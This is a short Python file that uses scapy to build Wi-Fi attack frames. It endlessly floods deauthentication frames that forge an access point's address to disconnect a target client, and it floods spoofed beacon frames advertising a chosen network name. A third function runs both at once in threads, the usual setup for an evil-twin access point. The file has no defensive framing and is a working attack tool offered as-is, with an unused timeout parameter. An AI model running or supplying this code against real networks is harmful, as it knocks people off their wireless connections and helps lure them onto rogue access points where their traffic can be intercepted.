import threading
from scapy.all import sendp, Dot11, RadioTap, Dot11Deauth, Dot11Beacon, Dot11Elt


def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
    packet = RadioTap() / \
        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
        Dot11Deauth(reason=reason)
    print(f'SENDING DEAUTH to {BSSID}')

    sendp(packet, iface=iface, loop=1, inter=0.01)


def beacon(iface: str, BSSID: str, SSID: str, timeout: int = 20):
    packet = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=BSSID, addr3=BSSID) / \
        Dot11Beacon() / \
        Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
    print(f'SENDING BEACON for {BSSID}')

    sendp(packet, iface=iface, loop=1, inter=0.1)


def deauth_with_beacon(iface: str, BSSID: str, client: str, SSID: str, reason: int = 7, timeout: int = 20):

    deauth_thread = threading.Thread(target=deauth, args=(iface, BSSID, client, reason))
    beacon_thread = threading.Thread(target=beacon, args=(iface, BSSID, SSID, timeout))

    deauth_thread.start()
    beacon_thread.start()

    deauth_thread.join()
    beacon_thread.join()
